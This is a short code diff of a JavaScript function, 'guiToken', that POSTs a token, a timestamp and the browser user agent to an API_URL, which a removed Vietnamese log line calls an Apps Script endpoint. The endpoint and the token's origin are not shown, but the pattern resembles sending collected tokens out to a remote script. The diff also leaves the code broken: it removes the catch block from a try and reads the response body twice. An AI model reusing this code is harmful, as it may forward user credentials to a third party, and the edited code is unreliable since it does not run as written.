@@ -49,38 +49,30 @@ async function guiToken(token){
 
     try{
 
-        const response = await fetch(API_URL,{
+const response = await fetch(API_URL, {
 
-            method:"POST",
+    method: "POST",
 
-            headers:{
-                "Content-Type":"application/json"
-            },
+    headers: {
+        "Content-Type": "application/json"
+    },
 
-            body:JSON.stringify({
+    body: JSON.stringify({
+        token: token,
+        time: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    })
 
-                token:token,
+});
 
-                time:new Date().toISOString(),
+        console.log("Status:", response.status);
 
-                userAgent:navigator.userAgent
-
-            })
-
-        });
-
-        console.log("Đã gửi lên Apps Script");
-        console.log("HTTP:", response.status);
+        console.log(await response.text());
 
         const text = await response.text();
         console.log("Kết quả:", text);
 
-    }catch(e){
-
-        console.error("Không gửi được Token", e);
-
     }
-
 }
 
 // ===========================
